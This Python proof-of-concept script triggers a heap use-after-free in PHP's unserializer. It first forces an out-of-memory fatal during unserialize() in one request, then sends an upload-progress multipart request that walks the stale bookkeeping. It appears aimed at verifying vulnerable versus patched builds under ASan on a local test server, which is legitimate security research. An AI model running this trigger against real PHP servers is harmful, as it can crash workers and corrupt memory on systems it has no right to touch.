#!/usr/bin/env python3
# INDEX: app unserialize() oom leaves stale BG(unserialize) uaf | cli | consumer must be next request
"""unserialize_dangle_uaf.py - CVE-2026-109619 unserializer stale bookkeeping.

R1 is an application-level unserialize() (unser.php, the WordPress
maybe_unserialize() / phpMyAdmin session shape) that hits the memory_limit fatal
while the decoder is live: php_var_unserialize_destroy() never runs, so
BG(unserialize) keeps a pointer into the request heap that shutdown frees. R2 is
an upload-progress multipart for session B whose request-startup FILE_START
update decodes B's non-empty record before RINIT, and tmp_var() walks the freed
bookkeeping -> heap use-after-free. R2 must be the very next request on the
worker (any plain request in between runs Basic's RINIT and resets
BG(unserialize)). Under ASan the worker dies with a report; a patched build
completes R2 normally.

Usage:
    python3 -I poc/bugs/unserialize_dangle_uaf.py http://127.0.0.1:8085
"""
from __future__ import annotations

import argparse
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http, report  # noqa: E402
from common.multipart import part_tuple as part, multipart_default as multipart  # noqa: E402
from common.session_ids import SID_B  # noqa: E402


def run(args):
    base = args.url.rstrip("/")

    # W2 first (and the payload build): every plain request between the
    # producer and the consumer would run Basic's RINIT and reset
    # BG(unserialize), so nothing may run between R1 and R2 below.
    s, b = http(f"{base}/sess.php?blob=0&sid={SID_B}", timeout=30)
    print(f"[W2] small session B: HTTP {s} {b[:40]!r}")
    s, b = http(base + "/unser.php", timeout=120)
    if s == 200 and b.startswith(b"payload built"):
        print(f"[W1] payload: {b[:40]!r}")
        s, b = http(base + "/unser.php", timeout=60)  # producer for real

    print(f"[R1 producer] GET {base}/unser.php - app-level unserialize() that "
          f"OOMs mid-decode (memory_limit fatal with the decoder live)")
    s, b = http(base + "/unser.php", timeout=60)
    print(f"[R1 producer] -> HTTP {s} {b[:50]!r} (status may read 200 once "
          f"output was flushed before the fatal)")

    # R2 consumer - MUST be the very next request on the worker.
    parts = [part("PHPSESSID", SID_B), part("PHP_SESSION_UPLOAD_PROGRESS", "k"),
             part("victim", b"V" * 1024, filename="victim.bin",
                  ctype="application/octet-stream")]
    body, headers = multipart(parts)
    print(f"[R2 consumer] POST {base}/poc.php ({len(body)} wire bytes) - decodes "
          f"session B through the stale bookkeeping")
    s, b = http(base + "/poc.php", data=body, headers=headers, timeout=60)
    report("R2 consumer", s, b, base, short_timeout=8)
    print("[unserialize_dangle_uaf] verdict: R2 died with an ASan heap-use-after-free in "
          "var_unserializer tmp_var() -> vulnerable; R2 completed -> patched. "
          "Check `docker compose logs cli-asan` for the report.")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("url")
    run(ap.parse_args())


if __name__ == "__main__":
    main()
